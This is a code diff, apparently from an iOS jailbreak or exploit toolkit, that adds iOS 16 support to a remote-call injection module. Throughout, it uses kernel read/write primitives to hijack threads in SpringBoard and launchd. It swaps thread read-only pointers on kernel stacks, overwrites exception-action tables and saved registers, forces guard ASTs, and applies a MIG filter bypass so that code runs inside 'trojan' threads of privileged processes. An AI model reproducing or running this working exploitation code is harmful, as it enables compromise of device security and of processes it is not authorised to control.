@@ -29,6 +29,8 @@
 
 extern bool gIsPACSupported;
 extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);
+extern mach_port_t bootstrap_port;
+extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
 
 // xnu-10002.81.5/osfmk/kern/exc_guard.h
 #define EXC_GUARD_ENCODE_TYPE(code, type) \
@@ -56,10 +58,37 @@ extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, 
 #define BREAKPOINT_ENABLE 481
 #define BREAKPOINT_DISABLE 0
 
+#define RC_IOS16_RESEARCH_ENABLED 1
+#define RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS 0x58
+#define RC_IOS16_KERNEL_SAVED_X27 0x40
+#define RC_IOS16_ZONE_WRITE_LEN 0x20
+#define RC_EXC_GUARD_INDEX 12
+#define RC_EXCEPTION_ACTION_SIZE 0x20
+#define RC_EXCEPTION_ACTION_PORT 0x0
+#define RC_EXCEPTION_ACTION_FLAVOR 0x8
+#define RC_EXCEPTION_ACTION_BEHAVIOR 0xc
+#define RC_IOS16_LCK_MTX_INTERLOCK_ONLY 0x10000000
+#define RC_IOS16_AST_GUARD 0x1000
+#define RC_IOS16_OFF_THREAD_MACHINE_CPUDATAP 0x140
+#define RC_IOS16_OFF_CPU_ACTIVE_THREAD 0x30
+#define RC_IOS16_OFF_CPU_PENDING_AST 0x4c
+#define RC_IOS16_MAX_THREAD_CANDIDATES 64
+#define RC_IOS16_ACTIVE_SCAN_SECONDS 60
+#define RC_IOS16_ACTIVE_SCAN_INTERVAL_US 50000
+#define RC_IOS16_DEBUG_LOG(...) do { printf(__VA_ARGS__); fflush(stdout); } while (0)
+
 uint64_t g_RC_targetProcOverride = 0;
 uint64_t g_RC_gadgetPacia = 0;
 static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
 static __thread uint32_t g_RC_lastInitFailurePid = 0;
+
+typedef struct {
+    uint64_t threadRo;
+    uint64_t actions;
+} rc_ios16_exception_actions_restore;
+
+static rc_ios16_exception_actions_restore g_rc_ios16_exception_actions_restore[16];
+static int g_rc_ios16_exception_actions_restore_count = 0;
 
 typedef struct RemoteCallState {
     uint64_t taskAddr;
@@ -77,6 +106,7 @@ typedef struct RemoteCallState {
     arm_thread_state64_internal originalState;
     uint64_t vmMap;
     uint64_t callThreadAddr;
+    mach_port_t callThreadPort;
     uint64_t trojanThreadAddr;
     int pid;
     bool success;
@@ -132,6 +162,7 @@ static void remote_call_pop_state(RemoteCallState *previous)
 #define g_RC_originalState         (remote_call_current_state()->originalState)
 #define g_RC_vmMap                 (remote_call_current_state()->vmMap)
 #define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
+#define g_RC_callThreadPort        (remote_call_current_state()->callThreadPort)
 #define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
 #define g_RC_pid                   (remote_call_current_state()->pid)
 #define g_RC_success               (remote_call_current_state()->success)
@@ -346,7 +377,525 @@ static void reap_dead_port_names_if_needed(const char *reason)
     (void)reap_dead_port_names(reason);
 }
 
+static bool rc_is_ios16(void)
+{
+#if !RC_IOS16_RESEARCH_ENABLED
+    return false;
+#else
+    NSOperatingSystemVersion version = NSProcessInfo.processInfo.operatingSystemVersion;
+    return version.majorVersion == 16;
+#endif
+}
+
+static bool rc_kernel_ptr_matches(uint64_t lhs, uint64_t rhs)
+{
+    if (lhs == rhs) return true;
+    if (!lhs || !rhs) return false;
+    return xpaci(lhs) == xpaci(rhs);
+}
+
+static bool rc_ios16_find_kernel_ptr_match(const void *buffer,
+                                           size_t size,
+                                           uint64_t needle,
+                                           size_t *offsetOut,
+                                           uint64_t *valueOut)
+{
+    const uint8_t *bytes = (const uint8_t *)buffer;
+    for (size_t off = 0; off + sizeof(uint64_t) <= size; off += sizeof(uint64_t)) {
+        uint64_t value = 0;
+        memcpy(&value, bytes + off, sizeof(value));
+        if (!rc_kernel_ptr_matches(value, needle)) continue;
+        if (offsetOut) *offsetOut = off;
+        if (valueOut) *valueOut = value;
+        return true;
+    }
+    return false;
+}
+
+static bool rc_ios16_write64_in_zone_block(uint64_t addr, uint64_t value)
+{
+    uint64_t base = addr & ~(uint64_t)(RC_IOS16_ZONE_WRITE_LEN - 1);
+    uint8_t block[RC_IOS16_ZONE_WRITE_LEN] = {0};
+    size_t off = (size_t)(addr - base);
+    if (off + sizeof(value) > sizeof(block)) return false;
+
+    kreadbuf(base, block, sizeof(block));
+    memcpy(block + off, &value, sizeof(value));
+    kwrite_zone_element(base, block, sizeof(block));
+    return rc_kernel_ptr_matches(kread64(addr), value);
+}
+
+static int rc_ios16_replace_kernel_ptr_matches(uint64_t base,
+                                               size_t size,
+                                               uint64_t needle,
+                                               uint64_t replacement)
+{
+    uint8_t *buffer = malloc(size);
+    if (!buffer) return 0;
+
+    memset(buffer, 0, size);
+    kreadbuf(base, buffer, size);
+
+    int count = 0;
+    for (size_t off = 0; off + sizeof(uint64_t) <= size; off += sizeof(uint64_t)) {
+        uint64_t value = 0;
+        memcpy(&value, buffer + off, sizeof(value));
+        if (!rc_kernel_ptr_matches(value, needle)) continue;
+
+        kwrite64(base + off, replacement);
+        if (rc_kernel_ptr_matches(kread64(base + off), replacement)) count++;
+    }
+
+    free(buffer);
+    return count;
+}
+
+static void rc_ios16_remember_exception_actions(uint64_t threadRo, uint64_t actions)
+{
+    if (!threadRo) return;
+
+    for (int i = 0; i < g_rc_ios16_exception_actions_restore_count; i++) {
+        if (g_rc_ios16_exception_actions_restore[i].threadRo == threadRo) return;
+    }
+
+    int max = (int)(sizeof(g_rc_ios16_exception_actions_restore) /
+                    sizeof(g_rc_ios16_exception_actions_restore[0]));
+    if (g_rc_ios16_exception_actions_restore_count >= max) {
+        RC_IOS16_DEBUG_LOG("[rc.iOS16] exception-actions restore table full tro=%#llx\n",
+                           threadRo);
+        return;
+    }
+
+    g_rc_ios16_exception_actions_restore[g_rc_ios16_exception_actions_restore_count].threadRo = threadRo;
+    g_rc_ios16_exception_actions_restore[g_rc_ios16_exception_actions_restore_count].actions = actions;
+    g_rc_ios16_exception_actions_restore_count++;
+}
+
+static void rc_ios16_restore_exception_actions(uint64_t skipThreadRo)
+{
+    for (int i = 0; i < g_rc_ios16_exception_actions_restore_count; i++) {
+        uint64_t tro = g_rc_ios16_exception_actions_restore[i].threadRo;
+        uint64_t actions = g_rc_ios16_exception_actions_restore[i].actions;
+        if (skipThreadRo && tro == skipThreadRo) continue;
+
+        bool restored = rc_ios16_write64_in_zone_block(tro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS,
+                                                       actions);
+        RC_IOS16_DEBUG_LOG("[rc.iOS16] restore exc-actions tro=%#llx actions=%#llx ok=%d\n",
+                           tro, actions, restored);
+    }
+    g_rc_ios16_exception_actions_restore_count = 0;
+}
+
+static bool rc_ios16_verify_exception_actions(uint64_t thread,
+                                              mach_port_t exceptionPort,
+                                              const char *stage)
+{
+    uint64_t tro = thread_get_t_tro(thread);
+    uint64_t actions = tro ? kread64(tro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
+    uint64_t guardAction = actions + (RC_EXC_GUARD_INDEX * RC_EXCEPTION_ACTION_SIZE);
+    uint64_t expectedPort = task_get_ipc_port_object(task_self(), exceptionPort);
+    uint64_t port = actions ? kread64(guardAction + RC_EXCEPTION_ACTION_PORT) : 0;
+    uint32_t behavior = actions ? kread32(guardAction + RC_EXCEPTION_ACTION_BEHAVIOR) : 0;
+    uint32_t flavor = actions ? kread32(guardAction + RC_EXCEPTION_ACTION_FLAVOR) : 0;
+    uint32_t expectedBehavior = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
+    uint32_t expectedFlavor = ARM_THREAD_STATE64;
+    bool ok = actions &&
+              rc_kernel_ptr_matches(port, expectedPort) &&
+              behavior == expectedBehavior &&
+              flavor == expectedFlavor;
+
+    RC_IOS16_DEBUG_LOG("[rc.iOS16] verify exc-actions %s thread=%#llx tro=%#llx actions=%#llx port=%#llx expected=%#llx behavior=%#x flavor=%#x ok=%d\n",
+                       stage ?: "unknown", thread, tro, actions, port, expectedPort,
+                       behavior, flavor, ok);
+    return ok;
+}
+
+static bool rc_ios16_install_shared_dummy_exception_actions(uint64_t thread,
+                                                           mach_port_t exceptionPort,
+                                                           uint32_t exceptionMask)
+{
+    kern_return_t kr = thread_set_exception_ports(g_RC_dummyThreadMach,
+                                                  exceptionMask,
+                                                  exceptionPort,
+                                                  EXCEPTION_STATE | MACH_EXCEPTION_CODES,
+                                                  ARM_THREAD_STATE64);
+    uint64_t targetTro = thread_get_t_tro(thread);
+    uint64_t dummyTro = g_RC_dummyThreadTro;
+    uint64_t targetOldActions = targetTro ? kread64(targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
+    uint64_t dummyActions = dummyTro ? kread64(dummyTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
+
+    RC_IOS16_DEBUG_LOG("[rc.iOS16] shared-actions kr=%#x thread=%#llx targetTro=%#llx old=%#llx dummyTro=%#llx dummyActions=%#llx\n",
+                       kr, thread, targetTro, targetOldActions, dummyTro, dummyActions);
+    if (!is_kaddr_valid(targetTro) || !is_kaddr_valid(dummyActions)) return false;
+
+    rc_ios16_remember_exception_actions(targetTro, targetOldActions);
+    uint64_t writeAddr = targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS;
+    bool wrote = rc_ios16_write64_in_zone_block(writeAddr, dummyActions);
+    return wrote && rc_kernel_ptr_matches(kread64(writeAddr), dummyActions);
+}
+
+static uint32_t rc_thread_task_threads_offset(void)
+{
+    return rc_is_ios16() ? 0x350 : off_thread_task_threads_next;
+}
+
+static uint32_t rc_task_threads_head_offset(void)
+{
+    return rc_is_ios16() ? 0x58 : off_task_threads_next;
+}
+
+static bool rc_ios16_is_task_thread_head(uint64_t entry, uint64_t task)
+{
+    return entry && task && entry == task + rc_task_threads_head_offset();
+}
+
+static bool rc_validate_thread_candidate(uint64_t thread, uint64_t expectedTask)
+{
+    if (!is_kaddr_valid(thread)) return false;
+
+    uint64_t task = thread_get_task(thread);
+    if (task != expectedTask) return false;
+
+    uint64_t tro = thread_get_t_tro(thread);
+    return is_kaddr_valid(tro);
+}
+
+static uint64_t rc_thread_from_task_threads_link(uint64_t entry, uint64_t expectedTask)
+{
+    if (rc_ios16_is_task_thread_head(entry, expectedTask)) return 0;
+    if (!is_kaddr_valid(entry)) return 0;
+
+    uint32_t offsets[] = {
+        rc_thread_task_threads_offset(),
+        off_thread_task_threads_next,
+        0x348,
+        0x350,
+    };
+    for (size_t i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++) {
+        uint32_t off = offsets[i];
+        if (!off || entry < off) continue;
+
+        uint64_t thread = entry - off;
+        if (rc_validate_thread_candidate(thread, expectedTask)) {
+            RC_IOS16_DEBUG_LOG("[rc.iOS16] resolved task thread entry=%#llx thread=%#llx off=%#x\n",
+                               entry, thread, off);
+            return thread;
+        }
+    }
+    return 0;
+}
+
+static uint64_t rc_resolve_task_thread_entry(uint64_t entry, uint64_t expectedTask)
+{
+    if (!rc_is_ios16()) return entry;
+    if (rc_validate_thread_candidate(entry, expectedTask)) return entry;
+    return rc_thread_from_task_threads_link(entry, expectedTask);
+}
+
+static uint64_t rc_next_task_thread(uint64_t thread, uint64_t expectedTask)
+{
+    uint64_t nextEntry = kread64(thread + rc_thread_task_threads_offset());
+    if (rc_is_ios16() && rc_ios16_is_task_thread_head(nextEntry, expectedTask)) return 0;
+    return rc_resolve_task_thread_entry(nextEntry, expectedTask);
+}
+
+static uint64_t rc_ios16_thread_cpu_datap(uint64_t thread)
+{
+    if (!is_kaddr_valid(thread)) return 0;
+    uint64_t cpuData = kread64(thread + RC_IOS16_OFF_THREAD_MACHINE_CPUDATAP);
+    return is_kaddr_valid(cpuData) ? cpuData : 0;
+}
+
+static bool rc_ios16_thread_is_active(uint64_t thread)
+{
+    uint64_t cpuData = rc_ios16_thread_cpu_datap(thread);
+    if (!cpuData) return false;
+    uint64_t activeThread = kread64(cpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD);
+    return rc_kernel_ptr_matches(activeThread, thread) && is_kaddr_valid(thread_get_kstackptr(thread));
+}
+
+static void rc_ios16_propagate_guard_ast_to_cpu(uint64_t thread, const char *stage)
+{
+    uint64_t cpuData = rc_ios16_thread_cpu_datap(thread);
+    if (!cpuData) return;
+
+    uint64_t activeThread = kread64(cpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD);
+    if (!rc_kernel_ptr_matches(activeThread, thread)) return;
+
+    uint32_t pending = kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST);
+    kwrite32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST, pending | RC_IOS16_AST_GUARD);
+    RC_IOS16_DEBUG_LOG("[rc.iOS16] guard AST propagated %s thread=%#llx cpu=%#llx before=%#x after=%#x\n",
+                       stage ?: "unknown",
+                       thread,
+                       cpuData,
+                       pending,
+                       kread32(cpuData + RC_IOS16_OFF_CPU_PENDING_AST));
+}
+
+static void rc_ios16_poke_springboard_first_exception(int round)
+{
+    if (round != 0) return;
+
+    static bool resolved = false;
+    static void *handle = NULL;
+    static int (*sbsGetScreenLockStatus)(BOOL *locked, BOOL *passcode) = NULL;
+    if (!resolved) {
+        handle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices", RTLD_LAZY);
+        if (handle) {
+            sbsGetScreenLockStatus = dlsym(handle, "SBSGetScreenLockStatus");
+        }
+        resolved = true;
+        RC_IOS16_DEBUG_LOG("[rc.iOS16] SpringBoard poke resolver handle=%p fn=%p\n",
+                           handle, sbsGetScreenLockStatus);
+    }
+    if (!sbsGetScreenLockStatus) return;
+
+    BOOL locked = NO;
+    BOOL passcode = NO;
+    int ret = sbsGetScreenLockStatus(&locked, &passcode);
+    RC_IOS16_DEBUG_LOG("[rc.iOS16] SpringBoard poke ret=%d locked=%d passcode=%d\n",
+                       ret, locked, passcode);
+}
+
+static void rc_ios16_poke_launchd_first_exception(int round)
+{
+    mach_port_t port = MACH_PORT_NULL;
+    kern_return_t kr = bootstrap_look_up(bootstrap_port,
+                                         "cyanide.rc-ios16.first-exception-poke",
+                                         &port);
+    if ((round % 10) == 0) {
+        RC_IOS16_DEBUG_LOG("[rc.iOS16] launchd poke round=%d kr=%d %s port=0x%x\n",
+                           round, kr, mach_error_string(kr), port);
+    }
+    if (port != MACH_PORT_NULL) {
+        mach_port_deallocate(mach_task_self_, port);
+    }
+}
+
+static void rc_ios16_poke_first_exception_target(const char *process, int round)
+{
+    if (!process) return;
+    if (strcmp(process, "SpringBoard") == 0) {
+        rc_ios16_poke_springboard_first_exception(round);
+    } else if (strcmp(process, "launchd") == 0) {
+        rc_ios16_poke_launchd_first_exception(round);
+    }
+}
+
+static bool rc_ios16_wait_first_exception(mach_port_t exceptionPort,
+                                          ExceptionMessage *exc,
+                                          const char *process)
+{
+    int totalTimeoutMS = 120000;
+    int sliceTimeoutMS = 100;
+    int rounds = totalTimeoutMS / sliceTimeoutMS;
+    if (rounds < 1) rounds = 1;
+
+    for (int round = 0; round < rounds; round++) {
+        if (wait_exception(exceptionPort, exc, sliceTimeoutMS, false)) return true;
+
+        if (process && strcmp(process, "SpringBoard") == 0) {
+            if ((round % 10) == 0) {
+                RC_IOS16_DEBUG_LOG("[rc.iOS16] first-exc wait SpringBoard round=%d/%d\n",
+                                   round + 1, rounds);
+            }
+        }
+        rc_ios16_poke_first_exception_target(process, round);
+        for (NSNumber *thread in g_RC_threadList) {
+            uint64_t value = thread.unsignedLongLongValue;
+            if (rc_ios16_thread_is_active(value)) {
+                rc_ios16_propagate_guard_ast_to_cpu(value, "first-exc-wait");
+            }
+        }
+    }
+    return false;
+}
+
+static uint64_t rc_ios16_find_active_target_thread(const char *process)
+{
+    int maxRounds = (RC_IOS16_ACTIVE_SCAN_SECONDS * 1000000) / RC_IOS16_ACTIVE_SCAN_INTERVAL_US;
+    for (int round = 0; round < maxRounds; round++) {
+        rc_ios16_poke_first_exception_target(process, round);
+
+        uint64_t entry = kread64(g_RC_taskAddr + rc_task_threads_head_offset());
+        uint64_t thread = rc_resolve_task_thread_entry(entry, g_RC_taskAddr);
+        for (int scanned = 0;
+             thread && scanned < RC_IOS16_MAX_THREAD_CANDIDATES;
+             scanned++, thread = rc_next_task_thread(thread, g_RC_taskAddr)) {
+            if (thread_get_task(thread) != g_RC_taskAddr) break;
+            if (!rc_ios16_thread_is_active(thread)) continue;
+
+            RC_IOS16_DEBUG_LOG("[rc.iOS16] %s active thread hit round=%d scanned=%d thread=%#llx\n",
+                               process ?: "target", round, scanned, thread);
+            return thread;
+        }
+
+        if ((round % 20) == 0) {
+            RC_IOS16_DEBUG_LOG("[rc.iOS16] %s active scan round=%d/%d\n",
+                               process ?: "target", round + 1, maxRounds);
+        }
+        usleep(RC_IOS16_ACTIVE_SCAN_INTERVAL_US);
+    }
+    return 0;
+}
+
+static bool set_exception_port_on_thread_ios16(mach_port_t exceptionPort,
+                                               uint64_t currThread,
+                                               bool useMigFilterBypass)
+{
+    bool success = false;
+    void *thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
+    void *pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
+    if (!thread_set_exception_ports_addr || !pthread_exit_addr) return false;
+
+    pthread_t pthread = NULL;
+    int createErr = pthread_create_suspended_np(&pthread, NULL,
+        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
+    if (createErr != 0 || !pthread) return false;
+
+    mach_port_t machThread = pthread_mach_thread_np(pthread);
+    if (!machThread) {
+        pthread_cancel(pthread);
+        return false;
+    }
+
+    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
+    if (!is_kaddr_valid(machThreadAddr)) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    if (useMigFilterBypass) {
+        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
+    }
+
+    arm_thread_state64_internal state;
+    memset(&state, 0, sizeof(state));
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
+                                        (thread_state_t)&state, &count);
+    if (kr != KERN_SUCCESS) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
+    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
+
+    uint64_t exceptionMask = EXC_MASK_GUARD |
+                             EXC_MASK_BAD_ACCESS |
+                             EXC_MASK_BAD_INSTRUCTION |
+                             EXC_MASK_BREAKPOINT |
+                             EXC_MASK_ARITHMETIC;
+
+    state.__x[0] = g_RC_dummyThreadMach;
+    state.__x[1] = exceptionMask;
+    state.__x[2] = exceptionPort;
+    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
+    state.__x[4] = ARM_THREAD_STATE64;
+
+    if (useMigFilterBypass) usleep(100000);
+
+    if (!thread_set_state_wrapper(machThread, machThreadAddr, &state)) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    if (useMigFilterBypass) usleep(100000);
+
+    uint32_t dummyOriginalMutex = kread32(g_RC_dummyThreadAddr + off_thread_mutex_lck_mtx_data);
+    kwrite32(g_RC_dummyThreadAddr + off_thread_mutex_lck_mtx_data,
+             RC_IOS16_LCK_MTX_INTERLOCK_ONLY);
+
+    if (!thread_resume_wrapper(machThread)) {
+        pthread_cancel(pthread);
+        mach_port_deallocate(mach_task_self_, machThread);
+        return false;
+    }
+
+    uint64_t targetTro = thread_get_t_tro(currThread);
+    uint64_t targetActionsBefore = targetTro ? kread64(targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
+    if (targetTro) rc_ios16_remember_exception_actions(targetTro, targetActionsBefore);
+
+    for (int i = 0; i < 10; i++) {
+        usleep(200000);
+
+        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
+        if (!is_kaddr_valid(kstack)) continue;
+
+        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
+        if (!is_kaddr_valid(kernelSP)) continue;
+
+        uint64_t searchBase = trunc_page(kernelSP);
+        size_t searchSize = 0x4000;
+        uint8_t *dataBuff = malloc(searchSize);
+        if (!dataBuff) break;
+        memset(dataBuff, 0, searchSize);
+        kreadbuf(searchBase, dataBuff, searchSize);
+
+        size_t foundOffset = 0;
+        uint64_t foundValue = 0;
+        bool found = rc_ios16_find_kernel_ptr_match(dataBuff, searchSize,
+                                                    g_RC_dummyThreadTro,
+                                                    &foundOffset,
+                                                    &foundValue);
+        free(dataBuff);
+        if (!found) {
+            RC_IOS16_DEBUG_LOG("[rc.iOS16] dummy TRO not found iter=%d needle=%#llx base=%#llx\n",
+                               i, g_RC_dummyThreadTro, searchBase);
+            continue;
+        }
+
+        int replaceCount = rc_ios16_replace_kernel_ptr_matches(searchBase, searchSize,
+                                                               g_RC_dummyThreadTro,
+                                                               targetTro);
+        uint64_t savedX27Addr = kstack + RC_IOS16_KERNEL_SAVED_X27;
+        uint64_t savedX27Before = kread64(savedX27Addr);
+        if (rc_kernel_ptr_matches(savedX27Before, g_RC_dummyThreadTro)) {
+            kwrite64(savedX27Addr, targetTro);
+        }
+
+        kwrite32(g_RC_dummyThreadAddr + off_thread_mutex_lck_mtx_data,
+                 dummyOriginalMutex);
+
+        RC_IOS16_DEBUG_LOG("[rc.iOS16] TRO swap iter=%d foundOff=%#zx foundVal=%#llx replaceCount=%d savedX27Before=%#llx\n",
+                           i, foundOffset, foundValue, replaceCount, savedX27Before);
+
+        usleep(100000);
+        if (rc_ios16_verify_exception_actions(currThread, exceptionPort, "after-stack-swap")) {
+            success = true;
+            break;
+        }
+
+        if (rc_ios16_install_shared_dummy_exception_actions(currThread,
+                                                            exceptionPort,
+                                                            (uint32_t)exceptionMask) &&
+            rc_ios16_verify_exception_actions(currThread, exceptionPort, "after-shared-actions")) {
+            success = true;
+            break;
+        }
+    }
+
+    kwrite32(g_RC_dummyThreadAddr + off_thread_mutex_lck_mtx_data,
+             dummyOriginalMutex);
+    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort,
+                               EXCEPTION_STATE | MACH_EXCEPTION_CODES,
+                               ARM_THREAD_STATE64);
+
+    if (useMigFilterBypass) usleep(100000);
+
+    mach_port_deallocate(mach_task_self_, machThread);
+    return success;
+}
+
 bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
+    if (rc_is_ios16()) {
+        return set_exception_port_on_thread_ios16(exceptionPort, currThread, useMigFilterBypass);
+    }
+
     bool success = false;
     
     void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
@@ -718,6 +1267,9 @@ void abandon_remote_call(void) {
     // Skip every SB-side IPC. Caller has decided that the remote task is dead
     // (typically SpringBoard finished a respawn). Touching the dead trojan
     // would hang for the call timeout. Local resources still need releasing.
+    if (rc_is_ios16()) {
+        rc_ios16_restore_exception_actions(0);
+    }
     destroy_exception_port(g_RC_firstExceptionPort);
     destroy_exception_port(g_RC_secondExceptionPort);
     if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
@@ -739,6 +1291,7 @@ void abandon_remote_call(void) {
     g_RC_selfThreadCtid = 0;
     g_RC_vmMap = 0;
     g_RC_callThreadAddr = 0;
+    g_RC_callThreadPort = MACH_PORT_NULL;
     g_RC_trojanThreadAddr = 0;
     g_RC_pid = 0;
     g_RC_success = false;
@@ -756,15 +1309,41 @@ int destroy_remote_call(void) {
         return 0;
     }
 
+    bool restoredIOS16ActionsBeforeRemoteCleanup = false;
+    if (rc_is_ios16() && g_RC_success && g_RC_trojanMem && g_RC_creatingExtraThread) {
+        uint64_t skipTro = 0;
+        if (g_RC_trojanThreadAddr) {
+            skipTro = thread_get_t_tro(g_RC_trojanThreadAddr);
+        }
+        rc_ios16_restore_exception_actions(skipTro);
+        restoredIOS16ActionsBeforeRemoteCleanup = true;
+    }
+
+    bool cleanupLaunchdSyntheticThread = rc_is_ios16() && g_RC_pid == 1 && g_RC_creatingExtraThread;
     if (g_RC_trojanMem) {
-        do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
+        if (cleanupLaunchdSyntheticThread) {
+            printf("[%s:%d] launchd synthetic cleanup skipping munmap trojanMem=0x%llx\n",
+                   __FUNCTION__, __LINE__, g_RC_trojanMem);
+        } else {
+            do_remote_call_stable(100, "munmap", g_RC_trojanMem, PAGE_SIZE, 0, 0, 0, 0, 0, 0);
+        }
         g_RC_trojanMem = 0;
     }
     if (g_RC_creatingExtraThread) {
-        do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
+        if (cleanupLaunchdSyntheticThread && MACH_PORT_VALID(g_RC_callThreadPort)) {
+            printf("[%s:%d] launchd synthetic cleanup via thread_terminate port=0x%x\n",
+                   __FUNCTION__, __LINE__, g_RC_callThreadPort);
+            do_remote_call_stable(-1, "thread_terminate", g_RC_callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+        } else {
+            do_remote_call_stable(-1, "pthread_exit", 0, 0, 0, 0, 0, 0, 0, 0);
+        }
     }
     else {
         restore_trojan_thread(&g_RC_originalState);
+    }
+
+    if (rc_is_ios16() && !restoredIOS16ActionsBeforeRemoteCleanup) {
+        rc_ios16_restore_exception_actions(0);
     }
 
     destroy_exception_port(g_RC_firstExceptionPort);
@@ -788,6 +1367,7 @@ int destroy_remote_call(void) {
     g_RC_selfThreadCtid = 0;
     g_RC_vmMap = 0;
     g_RC_callThreadAddr = 0;
+    g_RC_callThreadPort = MACH_PORT_NULL;
     g_RC_trojanThreadAddr = 0;
     g_RC_pid = 0;
     g_RC_success = false;
@@ -1181,17 +1761,23 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     
     g_RC_threadList = [NSMutableArray new];
     
-    int targetInjectedThreadCount = 2;
+    bool useIOS16RemoteCall = rc_is_ios16();
+    bool targetIsSpringBoard = process && strcmp(process, "SpringBoard") == 0;
+    bool targetIsLaunchd = process && strcmp(process, "launchd") == 0;
+    int targetInjectedThreadCount = useIOS16RemoteCall
+        ? 1
+        : 2;
     printf("[%s:%d] Target injected threads: %d\n",
            __FUNCTION__, __LINE__, targetInjectedThreadCount);
 
     int retryCount = 0;
     int validThreadCount = 0;
     int successThreadCount = 0;
-    uint64_t firstThread = kread64(g_RC_taskAddr + off_task_threads_next);
+    uint64_t firstEntry = kread64(g_RC_taskAddr + rc_task_threads_head_offset());
+    uint64_t firstThread = rc_resolve_task_thread_entry(firstEntry, g_RC_taskAddr);
     if (!firstThread || !is_kaddr_valid(firstThread)) {
-        printf("[%s:%d] invalid first thread for process %s task=%#llx firstThread=%#llx\n",
-               __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstThread);
+        printf("[%s:%d] invalid first thread for process %s task=%#llx firstEntry=%#llx firstThread=%#llx\n",
+               __FUNCTION__, __LINE__, process, g_RC_taskAddr, firstEntry, firstThread);
         remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
         destroy_remote_call();
         return -1;
@@ -1202,13 +1788,31 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     
     if (useMigFilterBypass)
         mig_bypass_resume();
+
+    if (useIOS16RemoteCall && (targetIsSpringBoard || targetIsLaunchd)) {
+        uint64_t activeThread = rc_ios16_find_active_target_thread(process);
+        if (!activeThread) {
+            printf("[%s:%d] iOS16 %s active thread scan failed\n",
+                   __FUNCTION__, __LINE__, process ?: "target");
+            if (useMigFilterBypass)
+                mig_bypass_pause();
+            remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
+            destroy_remote_call();
+            return -1;
+        }
+        firstThread = activeThread;
+        currThread = activeThread;
+    }
     
-    while (successThreadCount < targetInjectedThreadCount && validThreadCount < 5 && retryCount < 3) {
+    int maxValidThreadCount = useIOS16RemoteCall ? RC_IOS16_MAX_THREAD_CANDIDATES : 5;
+    while (currThread && successThreadCount < targetInjectedThreadCount && validThreadCount < maxValidThreadCount && retryCount < 3) {
         uint64_t task = thread_get_task(currThread);
         if (!task) {
             if (!validThreadCount) {
                 printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
                 firstThread = retry_first_thread(useMigFilterBypass);
+                if (useIOS16RemoteCall)
+                    firstThread = rc_resolve_task_thread_entry(firstThread, g_RC_taskAddr);
                 currThread = firstThread;
                 retryCount++;
                 continue;
@@ -1223,6 +1827,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 if (!validThreadCount) {
                     printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                     firstThread = retry_first_thread(useMigFilterBypass);
+                    if (useIOS16RemoteCall)
+                        firstThread = rc_resolve_task_thread_entry(firstThread, g_RC_taskAddr);
                     currThread = firstThread;
                     retryCount++;
                     continue;
@@ -1234,6 +1840,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                     if (!validThreadCount) {
                         printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                         firstThread = retry_first_thread(useMigFilterBypass);
+                        if (useIOS16RemoteCall)
+                            firstThread = rc_resolve_task_thread_entry(firstThread, g_RC_taskAddr);
                         currThread = firstThread;
                         retryCount++;
                         continue;
